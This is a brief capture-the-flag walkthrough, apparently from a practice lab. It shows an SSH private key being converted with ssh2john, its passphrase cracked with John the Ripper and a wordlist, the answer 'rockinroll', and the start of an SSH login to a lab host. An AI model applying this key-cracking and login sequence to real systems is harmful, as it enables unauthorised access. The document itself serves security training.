1) I put the id_rsa in a file with nano:
```
┌──(kali㉿kali)-[~]
└─$ nano id_rsa 
```

2) I bring the id_rsa in a format that john can read:
```
┌──(kali㉿kali)-[~]
└─$ ssh2john id_rsa > hash
```

3) I crack the hash:
```
┌──(kali㉿kali)-[~]
└─$ john hash -wordlist:/usr/share/wordlists/rockyou.txt                                                                        
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status

Use the "--show" option to display all of the cracked passwords reliably
```

4) Change the privileges of the id_rsa:  chmod 600 id_rsa
5) What is John's RSA Private Key passphrase?  rockinroll 
6) I do access to ssh service:
```
┌──(kali㉿kali)-[~]
└─$ ssh -i id_rsa john@10.10.252.159
Enter passphrase for key 'id_rsa':
